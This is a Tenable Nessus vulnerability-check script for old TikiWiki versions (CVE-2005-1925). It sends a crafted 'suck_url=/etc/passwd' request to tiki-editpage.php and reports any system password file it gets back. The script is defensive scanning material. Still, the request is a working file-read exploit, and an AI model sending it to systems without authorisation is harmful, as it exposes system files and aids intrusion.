#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description) {
  script_id(20185);
  script_version("$Revision: 1.8 $");

  script_cve_id("CVE-2005-1925");
  script_bugtraq_id(15390, 15392);

  script_name(english:"TikiWiki < 1.8.6 / 1.9.1 Multiple Vulnerabilities");
  script_summary(english:"Checks for multiple vulnerabilities in TikiWiki < 1.8.6 / 1.9.1");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by
multiple vulnerabilities." );
 script_set_attribute(attribute:"description", value:
"The remote host is running TikiWiki, an open-source wiki application
written in PHP. 

The version of TikiWiki installed on the remote host fails to sanitize
input to the 'language' parameter of the 'tiki-user_preferences.php'
script before using it in a PHP 'include' function.  An authenticated
attacker can leverage this issue by specifying a path with directory
traversal sequences to read arbitrary files and possibly execute
arbitrary PHP code on the remote host, subject to the privileges of
the web server user id. 

In addition, it also fails to sanitize input to the 'suck_url'
parameter of the 'tiki-editpage.php' script before using it to read
files.  With a specially-crafted request, an unauthenticated attacker
can exploit this issues to read arbitrary files on the remote host." );
 script_set_attribute(attribute:"see_also", value:"http://www.idefense.com/application/poi/display?id=335&type=vulnerabilities" );
 script_set_attribute(attribute:"see_also", value:"http://www.idefense.com/application/poi/display?id=337&type=vulnerabilities" );
 script_set_attribute(attribute:"see_also", value:"http://sourceforge.net/project/shownotes.php?release_id=350764" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to TikiWiki 1.8.6 / 1.9.1 or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:N" );
script_end_attributes();

 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");
 
  script_copyright(english:"This script is Copyright (C) 2005-2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80, embedded: 0);
if (!can_host_php(port:port)) exit(0);


# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/tiki", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs) {
  # Try to exploit one of the flaws to read /etc/passwd.
  w = http_send_recv3(method:"GET",
    item:string(
      dir, "/tiki-editpage.php?",
      "page=SandBox&",
      "do_suck=1&",
      "parsehtml=n&",
      "suck_url=/etc/passwd"
    ), 
    port:port
  );
  if (isnull(w)) exit(1, "the web server did not answer");
  res = w[2];

  # If it looks like TikiWiki...
  if ("This is Tiki" >< res) {
    # There's a problem if there's an entry for root.
    if (egrep(pattern:"root:.*:0:[01]:", string:res)) {
      if (report_verbosity > 0) {
        contents = strstr(res, "<textarea id='editwiki");
        if (contents) {
          contents = contents - strstr(contents, "</textarea>");
          contents = strstr(contents, ">");
          contents = contents - ">";
        }
        else contents = res;

        report = string(
          "\n",
          contents
        );
        security_warning(port:port, extra:report);
      }
      else security_warning(port);

      exit(0);
    }
    # The exploit won't work if Tiki's Sandbox feature is disabled.
    else if (report_paranoia > 1) {
      if (egrep(pattern:"This is Tiki v(0\.|1\.([0-7]\.|8\.[0-5][^0-9]|9\.0[^0-9]))", string:res)) {
        report = string(
          "\n",
          "Note that Nessus determined the vulnerabilities exist only\n",
          "by looking at the version number of TikiWiki installed on\n",
          "the remote host.\n"
        );

        security_warning(port:port, extra:report);
        exit(0);
      }
    }
  }
}
